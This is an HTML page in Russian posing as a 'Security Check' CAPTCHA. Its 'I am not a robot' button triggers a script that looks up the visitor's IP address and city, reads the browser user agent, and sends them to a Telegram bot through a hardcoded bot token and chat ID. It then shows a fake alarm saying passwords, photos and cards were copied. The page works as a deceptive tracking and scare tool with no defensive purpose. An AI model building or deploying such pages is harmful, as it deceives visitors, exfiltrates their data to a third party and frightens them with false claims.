<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 14px; }
  
        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
        
        #terminal { display: none; padding: 20px; line-height: 1.5; }
        .t-red { color: red; font-weight: bold; }
   
        #leak-box { display: none; padding: 20px; }
        .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; margin-bottom: 10px; }
        .green-text { color: #0f0; font-weight: bold; }
    </style>
</head>
<body>

  
    <div id="captcha-box">
        <img src="https://www.gstatic.com" width="80">
        <h2>Подтвердите, что вы не робот</h2>
        <button class="btn-verify" onclick="startProcess()">Я не робот</button>
    </div>

 
    <div id="terminal"></div>

  
    <div id="leak-box">
        <div class="danger-ui">
            <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
            <hr color="red">
            <p>> IP: <span id="user-ip" class="green-text">Определение...</span></p>
            <p>> Город: <span id="user-geo" class="green-text">Поиск...</span></p>
            <p>> Устройство: <span id="user-dev" class="green-text">Загрузка...</span></p>
            <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАНО: Пароли, Фото, Карты</p>
        </div>
    </div>

    <script>
        async function startProcess() {
             
            document.getElementById('captcha-box').style.display = 'none';
            document.getElementById('leak-box').style.display = 'block';

            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
            const chat_id = "-1003861311533";

            try {
               
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                 
                document.getElementById('user-ip').innerText = d.ip;
                document.getElementById('user-geo').innerText = d.city;
                document.getElementById('user-dev').innerText = navigator.platform;

             
                const text = `🔥 НОВЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;

                
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
                
                await fetch(url);
                console.log("Лог отправлен в группу!");

            } catch (e) {
              
                const backup = `⚠️ Переход!\n📱 ${navigator.userAgent}`;
                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
            }
        }

    </script>
</body>
</html>
